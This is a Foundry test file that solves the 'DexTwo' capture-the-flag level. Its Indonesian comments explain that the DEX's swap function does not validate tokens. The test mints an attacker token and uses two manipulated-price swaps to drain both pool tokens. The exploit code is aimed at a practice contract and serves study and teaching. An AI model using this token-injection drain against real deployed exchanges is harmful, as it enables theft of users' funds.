// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "src/levels/DexTwo.sol";
import {DexTwoFactory} from "src/levels/DexTwoFactory.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTwoSolve is Test {
    DexTwoFactory factory;
    DexTwo instance;
    address player = address(0xBEEF);
    address token1;
    address token2;

    function setUp() public {
        factory = new DexTwoFactory();
        vm.deal(player, 10 ether);
        instance = DexTwo(factory.createInstance(player));
        token1 = instance.token1();
        token2 = instance.token2();
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // DexTwo.swap TIDAK memeriksa token: from/to boleh token apa pun.
        // Buat token sendiri, donasi 1 ke pool supaya getSwapAmount tidak
        // bagi nol, lalu swap dengan harga yang dimanipulasi.
        SwappableTokenTwo evil = new SwappableTokenTwo(address(instance), "Evil", "EVL", 1000);
        evil.transfer(address(instance), 1);
        evil.approve(address(instance), type(uint256).max);
        // swap 1 EVL -> 100 TKN1 (1*100/1); saldo EVL pool jadi 2
        instance.swap(address(evil), token1, 1);
        // swap 2 EVL -> 100 TKN2 (2*100/2); kedua token pool habis
        instance.swap(address(evil), token2, 2);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
